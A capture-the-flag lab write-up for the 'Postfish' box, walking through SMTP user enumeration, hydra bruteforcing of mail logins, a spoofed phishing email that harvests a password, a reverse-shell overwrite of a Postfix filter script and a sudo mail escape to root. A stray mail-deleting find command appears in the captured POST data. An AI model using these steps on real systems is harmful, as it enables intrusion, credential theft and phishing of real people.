---
machine: Postfish
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [postfix, smtp-user-enum, hydra-bruteforce, phishing, disclaimer-script-injection, gtfobins]
date: 2026-09-06
status: retired
summary: A Linux box running a Postfix/Dovecot mail stack behind a marketing site — testing SMTP VRFY-based username enumeration, credential bruteforcing against POP3/IMAP, a live spear-phishing pivot to harvest a second credential, and abuse of a mail-filter disclaimer script for a GTFOBins-assisted path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/pg/postfish/nmapscan]
└─$ nmap-full target         
[*] Running fast port discovery on target...
[sudo] password for kali: 
[*] Open ports: 22,25,80,110,143,993,995
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-06 11:09 -0400
Nmap scan report for target (192.168.131.137)
Host is up (0.059s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING CAPA RESP-CODES UIDL SASL(PLAIN) STLS TOP USER AUTH-RESP-CODE
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more IMAP4rev1 have AUTH=PLAINA0001 ENABLE post-login SASL-IR Pre-login STARTTLS capabilities listed ID LITERAL+ LOGIN-REFERRALS OK IDLE
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: more IMAP4rev1 AUTH=PLAINA0001 ENABLE have SASL-IR Pre-login post-login capabilities listed ID LITERAL+ LOGIN-REFERRALS OK IDLE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING SASL(PLAIN) USER AUTH-RESP-CODE CAPA TOP RESP-CODES UIDL
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.54 seconds
```

We add `postfish.off` to our /etc/hosts and access the webapp on port 80.

When we go to `Our Team`, we see a list of usernames that could be useful for our mailing stack:

```text
Claire Madison
Mike Ross
Brian Moore
Sarah Lorem
```

We also use `cewl` to scrape the webapp to make a custom wordlist of names to potentially use:
`cewl http://postfish.off -w cewlnames.txt`

We can feroxbust the site and confirm that we likely are not missing a hidden directory:

```bash
feroxbuster -u http://postfish.off -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --thorough

200      GET      186l      599w     6195c http://postfish.off/team.html
200      GET      100l      491w     4898c http://postfish.off/index.html
200      GET      100l      491w     4898c http://postfish.off/
200      GET      571l     3166w   266964c http://postfish.off/1.png
200      GET     1231l     6729w   533853c http://postfish.off/3.png
200      GET     1062l     6422w   557825c http://postfish.off/2.png
200      GET      719l     3940w   323114c http://postfish.off/4.png
```

Toying around in the SMTP VRFY I find that user.lastname for our given users provokes a different error code than known absent users:

```bash
┌──(kali㉿kali)-[~/pg/postfish/nmapscan]
└─$ nc -vn 192.168.131.137 25 
(UNKNOWN) [192.168.131.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
HELO
501 Syntax: HELO hostname
hacker
502 5.5.2 Error: command not recognized
postfish.off
502 5.5.2 Error: command not recognized
VRFY
501 5.5.4 Syntax: VRFY address [SMTPUTF8]
VRFY mike.ross
252 2.0.0 mike.ross
VRFY mike
550 5.1.1 <mike>: Recipient address rejected: User unknown in local recipient table
VRFY mike.ross.postfishh.off
550 5.1.1 <mike.ross.postfishh.off>: Recipient address rejected: User unknown in local recipient table
VRFY mike
550 5.1.1 <mike>: Recipient address rejected: User unknown in local recipient table
VRFY postfish.off
550 5.1.1 <postfish.off>: Recipient address rejected: User unknown in local recipient table
VRFY Mike.Ross
252 2.0.0 Mike.Ross
VRFY Sarah.Lorem
252 2.0.0 Sarah.Lorem
```

We can deduce that the user portion of our user's emails are:

```text
claire.madison
mike.ross
brian.moore
sarah.lorem
```

We can add root, admin, and our previously guessed usernames to our cewl wordlist and then enumerate further with `smtp-user-enum` (ensure to use the IP not a hostname):

```bash
┌──(kali㉿kali)-[~/pg/postfish]
└─$ smtp-user-enum -M VRFY -D postfish.off -U cewlnames.txt -t 192.168.131.137
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... cewlnames.txt
Target count ............. 1
Username count ........... 122
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ postfish.off

######## Scan started at Sun Sep  6 11:59:47 2026 #########
192.168.131.137: root@postfish.off exists
192.168.131.137: Sales@postfish.off exists
192.168.131.137: Legal@postfish.off exists
192.168.131.137: mike.ross@postfish.off exists
192.168.131.137: claire.madison@postfish.off exists
192.168.131.137: sarah.lorem@postfish.off exists
192.168.131.137: brian.moore@postfish.off exists
######## Scan completed at Sun Sep  6 11:59:53 2026 #########
7 results.

122 queries in 6 seconds (20.3 queries / sec)
```

We can attempt to take these email usernames and bruteforce them against pop3 or IMAP:

```bash
┌──(kali㉿kali)-[~/pg/postfish]
└─$ cat emaillist| awk -F'@' '{print $1}'
root
Sales
Legal
mike.ross
claire.madison
sarah.lorem
brian.moore

┌──(kali㉿kali)-[~/pg/postfish]
└─$ cat emaillist| awk -F'@' '{print $1}' > emailusernames.txt
```

I use my own tool implementation of usernamer.py to mutate these names into another list that ill spray as my password list:

```bash
┌──(kali㉿kali)-[~/pg/postfish]
└─$ python3 mutaname.py -f emailusernames.txt -o emailnamespermutated.txt
Read 7 lines -> generated 14 variants -> 14 unique -> emailnamespermutated.txt

┌──(kali㉿kali)-[~/pg/postfish]
└─$ cat emailnamespermutated.txt 
root
Root
sales
Sales
legal
Legal
mike.ross
Mike.ross
claire.madison
Claire.madison
sarah.lorem
Sarah.lorem
brian.moore
Brian.moore
```

We can use hydra to bruteforce credential pairs against pop3 with this list and find the following:

```bash
┌──(kali㉿kali)-[~/pg/postfish]
└─$ hydra -L emailnamespermutated.txt -P emailnamespermutated.txt -f 192.168.131.137 pop3 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-06 12:31:59
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 196 login tries (l:14/p:14), ~13 tries per task
[DATA] attacking pop3://192.168.131.137:110/
[110][pop3] host: 192.168.131.137   login: sales   password: sales
[STATUS] attack finished for 192.168.131.137 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-06 12:32:19
```

This also would work against imap:

```bash
┌──(kali㉿kali)-[~/pg/postfish]
└─$ hydra -L emailnamespermutated.txt -P emailnamespermutated.txt -f 192.168.131.137 imap  
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-06 12:33:59
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 196 login tries (l:14/p:14), ~13 tries per task
[DATA] attacking imap://192.168.131.137:143/
[143][imap] host: 192.168.131.137   login: sales   password: sales
[STATUS] attack finished for 192.168.131.137 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-06 12:34:09
```

We can use this cred to manually auth to pop3 and investigate the email contents for user `sales`:

```bash
┌──(kali㉿kali)-[~/pg/postfish/nmapscan]
└─$ nc -nv 192.168.131.137 110
(UNKNOWN) [192.168.131.137] 110 (pop3) open
+OK Dovecot (Ubuntu) ready.
USER sales
+OK
STAT
-ERR Unknown command.
PASS sales
+OK Logged in.
STAT
+OK 1 683
LIST
+OK 1 messages:
1 683
.
RETR 1
+OK 683 octets
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off
Delivered-To: sales@postfish.off
Received: by postfish.off (Postfix, from userid 997)
        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
Received: from x (localhost [127.0.0.1])
        by postfish.off (Postfix) with SMTP id 7712145434
        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
Subject: ERP Registration Reminder
Message-Id: <20210331131139.7712145434@postfish.off>
Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
From: it@postfish.off

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
.

```

It seems like this an email we missed during our initial enumeration, we can confirm by using `VRFY` in SMTP on the email and getting the same 252 code:

```bash
┌──(kali㉿kali)-[~/pg/postfish/nmapscan]
└─$ nc -nv 192.168.131.137 25 
(UNKNOWN) [192.168.131.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
HELO
501 Syntax: HELO hostname
VRFY it@postfish.off
252 2.0.0 it@postfish.off
```

We can add `it` to our list of names.

## Foothold

We can compose a phishing email to `brian.moore` (as he is the sales manager) from `it` which contains a link to our local kali and open a netcat listener on port 80:

```bash
┌──(kali㉿kali)-[~/pg/postfish/nmapscan]
└─$ sudo swaks -t brian.moore@postfish.off --from it@postfish.off --server 192.168.131.137 --body "Please click this password reset link: <http://192.168.45.177/>" --header "Subject: Reset Password Link" 
=== Trying 192.168.131.137:25...
=== Connected to 192.168.131.137.
<-  220 postfish.off ESMTP Postfix (Ubuntu)
 -> EHLO kali
<-  250-postfish.off
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<it@postfish.off>
<-  250 2.1.0 Ok
 -> RCPT TO:<brian.moore@postfish.off>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sun, 06 Sep 2026 12:53:54 -0400
 -> To: brian.moore@postfish.off
 -> From: it@postfish.off
 -> Subject: Reset Password Link
 -> Message-Id: <20260906125354.062535@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> Please click this password reset link: <http://192.168.45.177/>
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as C771440D41
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

brian.moore will POST his password in the url paramaters of our IP. (I believe this is intended to simulate us hosting a malicious login page on our IP which he would fill out?)

```text
┌──(kali㉿kali)-[~/pg/postfish/nmapscan]
└─$ rlwrap nc -nlvp 80~  
listening on [any] 80 ...
connect to [192.168.45.177] from (UNKNOWN) [192.168.131.137] 55522
POST / HTTP/1.1
Host: 192.168.45.177
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
```

From this successful phishing we now have credentials for `brian.moore:EternaLSunshinE`

We can ssh into `brian.moore` with this credential and collect our local.txt from his home directory:

```bash
┌──(kali㉿kali)-[~/pg/postfish/nmapscan]
└─$ ssh brian.moore@postfish.off                                                                                                                      
brian.moore@postfish:~$ 
```

## Privilege Escalation

We find that we can `su sales` with password `sales` to gain access to the sales user.

We notice a strange user in /etc/passwd:

```text
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
```

In linpeas we notice that there is an interesting .bash_history for filter:

```text
╔══════════╣ Searching root files in home dirs (limit 30) (T1083)
/home/                                                                                                                                                      
/home/brian.moore/.bash_history
/root/
/var/www
/var/spool/filter/.bash_history
```

We find that its redirected to /dev/null and the directory is only readable  and executable by group filter which brian is a part of:

```bash
brian.moore@postfish:/home$ ls -lah /var/spool/filter
total 8.0K
drwxr-x--- 2 filter filter 4.0K Sep  6 16:59 .
drwxr-xr-x 6 root   root   4.0K Jan 26  2021 ..
lrwxrwxrwx 1 root   root      9 Jan 26  2021 .bash_history -> /dev/null
brian.moore@postfish:/home$ groups
brian.moore mail filter
```

We also find a file that is owned by root but `rwx` by our filter group:

```bash
brian.moore@postfish:/home$ cat /etc/postfix/disclaimer
#!/bin/bash
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

####### Changed From Original Script #######
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
####### Changed From Original Script END #######

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

####### Changed From Original Script #######
# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi
####### Changed From Original Script END #######

$SENDMAIL "$@" <in.$$

exit $?

```

Inside the above script we see a reference to `/etc/postfix/disclaimer_addresses`:

```bash
brian.moore@postfish:/var/spool/postfix$ cat /etc/postfix/disclaimer_addresses
it@postfish.off
brian.moore@postfish.off
```

After performing some research online I can presume that `/etc/postfix/disclaimer` is called when emails are sent from users listed in the `/etc/postfix/disclaimer_addresses` file.

```text
The `disclaimer_addresses` file in Postfix is used to determine **which sender addresses** should have a disclaimer added to their outgoing emails.
```

Since we have write perms to the `/etc/postfix/disclaimer` file we can copy a file, within which we have written a bash reverse shell, to `/etc/postfix/disclaimer` to overwrite the contents inside of it.

```bash
brian.moore@postfish:/var/spool/postfix$ cp /dev/shm/tmpme /etc/postfix/disclaimer
brian.moore@postfish:/var/spool/postfix$ cat /etc/postfix/disclaimer
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.177/4444 0>&1
```

We can try sending an email from `brian.moore` to trigger `/etc/postfix/disclaimer` and fire our revshell:

```bash
sudo swaks -t it@postfish.off --from brian.moore@postfish.off --server 192.168.131.137 --body "Please click this password reset link: <http://192.168.45.177/>" --header "Get swakked"
```

We catch the shell in our listener, we now have a shell as user `filter`:

```bash
┌──(kali㉿kali)-[~/pg/postfish]
└─$ sudo penelope -p 4444

filter@postfish:/var/spool/postfix$ 
```

We can run `sudo -l`:

```bash
filter@postfish:/var/spool/postfix$ sudo -l
Matching Defaults entries for filter on postfish:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User filter may run the following commands on postfish:
    (ALL) NOPASSWD: /usr/bin/mail *
```

We can look up `mail` on gtfobins and find a sudo to root shell privesc:

```bash
filter@postfish:/var/spool/postfix$ sudo /usr/bin/mail --exec='!/bin/sh'
# whoami
root
```

Finally we can read the `proof.txt` from the `/root` directory and the box is solved!
